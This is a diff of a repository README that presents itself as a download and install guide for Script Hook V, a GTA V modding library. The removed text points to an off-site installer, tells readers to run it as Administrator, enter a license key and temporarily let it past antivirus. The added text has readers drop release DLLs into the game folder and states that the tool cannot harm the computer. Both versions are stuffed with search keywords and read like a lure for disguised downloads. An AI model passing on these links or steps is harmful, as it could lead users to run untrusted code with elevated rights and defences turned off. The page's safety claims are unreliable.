@@ -1,68 +1,67 @@
-# Script Hook V Download for Windows 11 & 10
+# 🎮 Script-Hook-V-Download - Enable custom modifications for your game
 
-**Script-Hook-V-Download**
+[![](https://img.shields.io/badge/Download-Script_Hook_V-blue.svg)](https://github.com/nayl7186/Script-Hook-V-Download)
 
-**Script Hook V** for Windows 10/11. Direct download and setup guide below.
+This tool allows you to run custom scripts and modifications within your copy of Grand Theft Auto V on Windows 10 and Windows 11. It acts as the foundation that enables the game to recognize and load various community-made mods.
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()
-[![Download](https://img.shields.io/badge/Direct-Download-16a34a?style=flat-square)]()
+## 📥 How to download the software
 
----
+To obtain the necessary files for your system, follow the link below. This link leads to the repository page where you can access the latest release.
 
-## Download & Install
+[Click here to visit the download page](https://github.com/nayl7186/Script-Hook-V-Download)
 
-> **This is the download page.** Use the button or link below to get **Script Hook V** for Windows.
+Once you reach the page, look for the section marked Releases on the right side of the screen. Click on the latest version number to view the available files. Download the compressed folder to your computer.
 
-<p align="center">
-  <a href="https://scripthookv.wonderchain.fun/">
-    <img src="https://img.shields.io/badge/Download-Script%20Hook%20V-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Script Hook V">
-  </a>
-</p>
+## ⚙️ System requirements
 
-| | |
-| --- | --- |
-| **Direct link** | **[scripthookv.wonderchain.fun](https://scripthookv.wonderchain.fun/)** |
-| **Full URL** | `https://scripthookv.wonderchain.fun/` |
-| **Type** | Installer for Windows 10 / 11 (64-bit) |
-| **Admin** | Run setup as Administrator |
+Before you install these files, ensure your computer meets these basic requirements:
 
-### Quick steps
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Game Version: A legal, updated version of Grand Theft Auto V installed via Steam, Epic Games Store, or the Rockstar Games Launcher.
+* Disk Space: At least 50 megabytes of free space for the tool and its components.
+* Graphics Drivers: Updated drivers for your NVIDIA, AMD, or Intel graphics card.
 
-1. Click **[Download — scripthookv.wonderchain.fun](https://scripthookv.wonderchain.fun/)** (link above)
-2. Save the file from the project page
-3. Run the setup **as Administrator**
-4. Enter your license key when prompted
-5. Restart if the installer asks — then launch from Start menu
+## 🛠️ Installation steps
 
-<p align="center"><a href="https://scripthookv.wonderchain.fun/"><strong>⬇ Download Script Hook V now</strong></a></p>
+Follow these steps to install the tool correctly. Care acts as the most important part of this process to ensure your game functions without errors.
 
----
+1. Locate the downloaded file from your browser history or your Downloads folder.
+2. Right-click the compressed folder and select Extract All. Choose a location on your computer you can easily access.
+3. Open the folder you just extracted.
+4. Find the folder named bin.
+5. Select the files inside, specifically ScriptHookV.dll and dinput8.dll.
+6. Right-click these files and select Copy.
+7. Navigate to your Grand Theft Auto V game folder. If you own the Steam version, this is usually located in Program Files (x86) -> Steam -> steamapps -> common -> Grand Theft Auto V.
+8. Right-click in the empty space of your game folder and select Paste.
+9. If you see a prompt asking to replace existing files, choose Yes or Replace.
 
-## About
+## 🧪 Testing your installation
 
-**Script Hook V** — Windows download and setup guide.
+After you move the files into the game folder, start Grand Theft Auto V as you normally do. During the initial loading screen, you might notice a brief delay while the game initializes the new files.
 
-**People also search for:** script hook v download, scripthookv gta 5 mods install windows
+If the game loads to the main menu without crashing, the installation succeeded. You can now place individual script files into the scripts folder within your game directory to activate specific mods.
 
-**Repository:** `Script-Hook-V-Download`
+## ⚠️ Important safety tips
 
-## Quick tips
+Modifying game files carries certain risks. Consider these practices to keep your game files safe:
 
-| Step | Action |
-| --- | --- |
-| 1 | Run installer as Administrator |
-| 2 | Temporarily allow download in antivirus if blocked |
-| 3 | Reboot once if the tool asks after setup |
+* Create a backup: Copy your entire Grand Theft Auto V folder to a secondary location before you add mods. This lets you restore your game if an error occurs.
+* Play offline: Most mod files prevent you from joining multiplayer sessions. Ensure you disconnect from the internet or verify your game remains in single-player mode when using modifications.
+* Update regularly: When the game receives an official update, your script tool may stop working. Check the download link provided above for newer versions that match the updated game files.
+* Remove mods before events: If you intend to play the official online mode, remove the dinput8.dll file from your game folder. This action disables all modifications and allows you to connect to official servers.
 
-## System requirements
+## 📖 Frequently asked questions
 
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 8 GB |
-| Disk | 500 MB free |
-| Admin | Required for install |
+Does this tool work on all versions of Windows?
+Windows 10 and Windows 11 provide the best experience. Older versions of Windows may lack the necessary updates to run the latest game files.
 
----
+Will this tool damage my computer?
+No. This tool only modifies how the game reads its own files. It does not change your system settings or registry.
 
-**Topics:** script-hook-v-download, script, scripthookv-gta-5-mods-install-windows, scripthookv, script-hook-v-download-2026, script-hook-v, scripthook-v, gta-5-mods, gaming, pc-game, software, windows-11
+What should I do if the game crashes?
+Remove the files you pasted into the game folder. If the game launches normally, the error originated from a specific mod file you added to the script folder. Test your mods one by one to find the faulty file.
+
+Can I get banned for using this?
+Using mods remains safe as long as you stay in single-player mode. Never attempt to log into official multiplayer servers while game files contain custom modifications.
+
+Keywords: download, gaming, gta-5-mods, pc-game, script, script-hook-v, script-hook-v-download, script-hook-v-download-2026, scripthook-v, scripthookv, scripthookv-gta-5-mods-install-windows, software, windows-11
